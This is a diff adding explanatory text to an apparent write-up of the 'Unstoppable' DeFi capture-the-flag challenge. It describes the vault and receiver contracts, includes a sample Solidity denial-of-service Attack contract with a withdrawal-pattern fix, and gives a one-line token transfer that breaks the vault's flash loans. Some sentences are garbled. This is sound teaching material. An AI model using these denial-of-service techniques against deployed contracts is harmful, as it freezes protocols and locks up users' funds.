@@ -127,6 +127,24 @@ contract UnstoppableVault is IERC3156FlashLender, ReentrancyGuard, Owned, ERC462
 }
 ```
 
+This contract provides the functionality for executing flash loans and managing the fees associated with them. It ensures that the flash loan is properly executed and that the fees are transferred to the designated fee recipient.
+
+- The contract defines constants such as FEE_FACTOR (0.05 ether) and GRACE_PERIOD (30 days).
+- The contract has a feeRecipient address variable that stores the address where the flash loan fees will be sent.
+
+In the constructor initializes the feeRecipient address and emits an event to notify the update.
+
+
+`maxFlashLoan()` : Returns the maximum amount that can be borrowed in a flash loan, while the flashFee function calculates the fee to be charged for a flash loan.
+
+`flashFee()` : Returns the flash's fee.
+
+`setFeeRecipient()` : Allows the owner to update the feeRecipient address.
+
+`totalAssets()` : Returns the total amount of assets held by the contract.
+
+`flashLoan()` : Allows users to execute a flash loan. It transfers the requested amount of tokens to the receiver contract, executes the receiver's callback function, and then transfers back the borrowed amount plus the fee. If the callback function does not return the expected magic value, the flash loan is considered failed.
+
 **ReceiverUnstoppable.sol**
 
 ```solidity
@@ -177,18 +195,144 @@ contract ReceiverUnstoppable is Owned, IERC3156FlashBorrower {
 }
 ```
 
+This is a smart contract called `ReceiverUnstoppable` that is designed to receive flash loans from the UnstoppableVault contract.
+
+The contract imports the IERC3156FlashBorrower interface from the OpenZeppelin library, which allows it to interact with the flash loan functionality. Also it imports the Owned contract from the solmate library, which provides ownership functionality.
+
+And, the contract has a constructor function that takes the address of the UnstoppableVault contract as a parameter and sets it as an immutable variable.
+
+
+`onFlashLoan()` : This function from the IERC3156FlashBorrower interface. It is called by the UnstoppableVault contract when a flash loan is initiated. It checks that the initiator is the contract itself, the sender is the UnstoppableVault contract, the token is the same as the asset of the UnstoppableVault contract, and the fee is 0. If any of these conditions are not met, it reverts the transaction.
+
+`executeFlashLoan()` : This function is a public function that can only be called by the owner of the contract. It calls the `flashLoan()` function of the UnstoppableVault contract, passing the contract itself as the borrower, the asset address, the loan amount, and an empty bytes array as parameters.
+
+
+Overall, this contract acts as a receiver for flash loans from the UnstoppableVault contract, allowing the owner of the contract to execute flash loans of a specified amount.
+
 Challenge's message:
 
 > There’s a tokenized vault with a million DVT tokens deposited. It’s offering flash loans for free, until the grace period ends.
 To pass the challenge, make the vault stop offering flash loans.
 You start with 10 DVT tokens in balance.
 
+## DoS Attack In Solidity
+
+There are many ways to attack a smart contract to make it unusable. DoS is one of the most popular way to perform this aim. Shortly, any interference with a Service that reduces or loses its availability is called a Denial of Service. Simply put, normal service requests that a user needs cannot be processed by the system. For example, when a computer system crashes or its bandwidth is exhausted or its hard disk is filled up so that it cannot provide normal service, it constitutes a DoS. 
+
+In the blockchain, DoS attacks disrupt, suspend, or freeze the execution of a normal contract, or even the logic of the contract itself.
+
+#### Example: King Of Ether
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+/*
+The goal of KingOfEther is to become the king by sending more Ether than
+the previous king. Previous king will be refunded with the amount of Ether
+he sent.
+*/
+
+/*
+1. Deploy KingOfEther
+2. Alice becomes the king by sending 1 Ether to claimThrone().
+2. Bob becomes the king by sending 2 Ether to claimThrone().
+   Alice receives a refund of 1 Ether.
+3. Deploy Attack with address of KingOfEther.
+4. Call attack with 3 Ether.
+5. Current king is the Attack contract and no one can become the new king.
+
+What happened?
+Attack became the king. All new challenge to claim the throne will be rejected
+since Attack contract does not have a fallback function, denying to accept the
+Ether sent from KingOfEther before the new king is set.
+*/
+
+contract KingOfEther {
+    address public king;
+    uint public balance;
+
+    function claimThrone() external payable {
+        require(msg.value > balance, "Need to pay more to become the king");
+
+        (bool sent, ) = king.call{value: balance}("");
+        require(sent, "Failed to send Ether");
+
+        balance = msg.value;
+        king = msg.sender;
+    }
+}
+
+contract Attack {
+    KingOfEther kingOfEther;
+
+    constructor(KingOfEther _kingOfEther) {
+        kingOfEther = KingOfEther(_kingOfEther);
+    }
+
+    // You can also perform a DOS by consuming all gas using assert.
+    // This attack will work even if the calling contract does not check
+    // whether the call was successful or not.
+    //
+    // function () external payable {
+    //     assert(false);
+    // }
+
+    function attack() public payable {
+        kingOfEther.claimThrone{value: msg.value}();
+    }
+}
+```
+
+## How to prevent DoS Attack?
+
+To prevent this attack, developers can modify the King of the Ether smart contract to utilize a withdrawal pattern that enables players to withdraw their winnings instead of having them sent directly from the play function. Here’s an example implementation:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+contract KingOfEther {
+    address public king;
+    uint public balance;
+    mapping(address => uint) public balances;
+
+    function claimThrone() external payable {
+        require(msg.value > balance, "Need to pay more to become the king");
+
+        balances[king] += balance;
+
+        balance = msg.value;
+        king = msg.sender;
+    }
+
+    function withdraw() public {
+        require(msg.sender != king, "Current king cannot withdraw");
+
+        uint amount = balances[msg.sender];
+        balances[msg.sender] = 0;
+
+        (bool sent, ) = msg.sender.call{value: amount}("");
+        require(sent, "Failed to send Ether");
+    }
+}
+```
+
 # Subverting
 
+To discharge this challenge, we must broken vault's flashs with enforce `(convertToShares(totalSupply) != balanceBefore)` condition.
+
+In the `UnstoppableVault` contract, the asset is the underlying token called `DVT` that user deposit/withdraw into the vault. And the share is the amount of vault tokens called `oDVT` that the vault mint/burn for users to represent their deposited assets.
+
+ERC4626 is an extension of ERC20 that proposes a standard interface for token vaults. `convertToShares()` function returns the amount of shares that would be exchanged by the vault for the amount of assets provided. In this case, this function open to enforce. In other words, totalSupply of the vault tokens should always equal totalAsset of underlying tokens before any flash loan execution. If there are other implementations of the vault that divert asset tokens to other contracts, the flashLoan function would be inactive.
+
+Since the contract is an ERC20, we can use transfer() to send DVT tokens to it. Thus, the lender is unable to provide any additional flashloans.
 
 ```js
 await token.transfer(vault.address, token.balanceOf(player.address));
 ```
+
+Solve the challenge.
 
 ```powershell
   [Challenge] Unstoppable
